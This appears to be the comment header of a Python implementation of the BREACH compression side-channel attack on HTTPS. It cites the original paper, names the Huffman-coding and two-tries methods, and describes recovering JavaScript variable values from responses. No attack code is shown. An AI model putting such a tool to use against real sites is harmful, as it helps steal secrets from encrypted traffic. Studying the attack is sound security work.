# # BREACH Implementation

# ### Authors

# * Miguel Enrile

# This is a BREACH attack implementation in Python. It is not as optimized as it should be, but I wouldn't dare touch anything.
# The attack is fully detailed in the following URL: http://breachattack.com/resources/BREACH%20-%20SSL,%20gone%20in%2030%20seconds.pdf
# 
# For this implementation, we will only use the *Huffman Coding and the Two-Tries Method* shown in the paper above to deduce the value of different variables.

# These are the target elements we want to hack. Each dictionary contains the name of the parameter and the format of the parameter, which is a string of possible characters.
# If the number of possibilities is lower, it will take less time to finish. All of them should technically work, but the first two have been tested and validated.

# In JavaScript, there are different ways to assign a value to a variable.
# 1. **Number**. It will start with 0,1,2,3,4,5,6,7,8, or 9
# 2. **String**. It will start with `'` or `"`
# 3. **Object**. As JSON notation, `{}`
# 4. **Array**. As JSON notation, `[]`
# 5. **Boolean**. It has only two values, `true` or `false`
# 6. **Null value**. Represented as `null`
# 
# There are other types of assignments ($, variable name, or by object creation with `new`), but we will assume that those are the possible values.
# 
# So the possible start characters are defined in a list. We will focus on the first four, since those provide more information.
